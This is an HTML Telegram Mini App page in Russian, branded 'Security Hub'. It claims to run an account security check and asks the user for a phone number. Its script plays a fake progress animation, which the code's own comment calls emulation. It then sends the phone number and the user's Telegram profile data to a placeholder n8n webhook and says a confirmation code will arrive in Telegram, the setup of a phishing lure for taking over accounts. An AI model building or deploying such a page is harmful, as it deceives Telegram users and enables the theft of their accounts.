<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0f172a;
            --accent: #38bdf8;
            --glass: rgba(30, 41, 59, 0.7);
        }

        body {
            background: radial-gradient(circle at top right, #1e293b, #0f172a);
            color: #f8fafc;
            font-family: 'Inter', sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .card {
            width: 85%;
            max-width: 360px;
            padding: 40px 24px;
            background: var(--glass);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        .icon-box {
            width: 72px;
            height: 72px;
            background: linear-gradient(135deg, #38bdf8, #818cf8);
            border-radius: 20px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 20px rgba(56, 189, 248, 0.3);
        }

        h2 { font-size: 26px; font-weight: 700; margin: 0 0 10px; letter-spacing: -0.5px; }
        p { color: #94a3b8; font-size: 15px; line-height: 1.5; margin-bottom: 32px; }

        .input-group { margin-bottom: 24px; }
        input {
            width: 100%;
            background: rgba(15, 23, 42, 0.5);
            border: 1.5px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 18px;
            color: #fff;
            font-size: 17px;
            box-sizing: border-box;
            transition: 0.3s;
            outline: none;
            text-align: center;
        }
        input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.15); }

        button {
            width: 100%;
            background: #fff;
            color: #0f172a;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
        }
        button:active { transform: scale(0.96); opacity: 0.9; }

        /* Состояния */
        #loader, #success { display: none; }
        .spinner {
            width: 30px; height: 30px; border: 3px solid rgba(56, 189, 248, 0.2);
            border-top-color: var(--accent); border-radius: 50%;
            animation: spin 0.8s linear infinite; margin: 0 auto 15px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div id="main-content">
            <div class="icon-box">
                <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
            </div>
            <h2>Security Hub</h2>
            <p>Проверка безопасности аккаунта через зашифрованный протокол MTProto</p>
            
            <div class="input-group">
                <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
            </div>
            <button onclick="handleStart()">Начать проверку</button>
        </div>

        <div id="loader">
            <div class="spinner"></div>
            <p>Установка защищенного соединения...</p>
        </div>

        <div id="success">
            <div style="color: #4ade80; font-size: 48px; margin-bottom: 10px;">✓</div>
            <h3>Запрос отправлен</h3>
            <p>Код подтверждения придет в официальный чат Telegram</p>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function handleStart() {
            const phone = document.getElementById('phone').value;
            if (phone.length < 10) {
                tg.HapticFeedback.notificationOccurred('error');
                alert('Введите корректный номер');
                return;
            }

            tg.HapticFeedback.impactOccurred('medium');
            document.getElementById('main-content').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // Эмуляция процесса
            setTimeout(() => {
                document.getElementById('loader').innerText = "Синхронизация данных...";
            }, 2000);

            // ОТПРАВКА В N8N
            const WEBHOOK_URL = 'ТВОЙ_WEBHOOK_URL'; 
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: phone,
                    user: tg.initDataUnsafe?.user || 'test_user'
                })
            }).then(() => {
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('success').style.display = 'block';
                    tg.HapticFeedback.notificationOccurred('success');
                }, 1500);
            });
        }
    </script>
</body>
</html>
